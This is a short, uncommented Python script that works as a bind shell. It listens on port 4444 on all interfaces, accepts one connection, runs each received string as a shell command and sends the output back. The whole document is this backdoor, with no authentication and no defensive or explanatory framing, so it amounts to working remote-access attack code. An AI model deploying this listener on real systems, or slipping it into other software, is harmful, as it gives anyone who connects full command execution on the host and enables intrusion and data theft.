import socket
import subprocess

host = '0.0.0.0'
port = 4444

s = socket.socket()
s.bind((host, port))
s.listen(1)

print(f'Listening on port {port}...')

conn, addr = s.accept()

print(f'Connection established from {addr}...')

while True:
    command = conn.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    conn.send(output.encode())

conn.close()
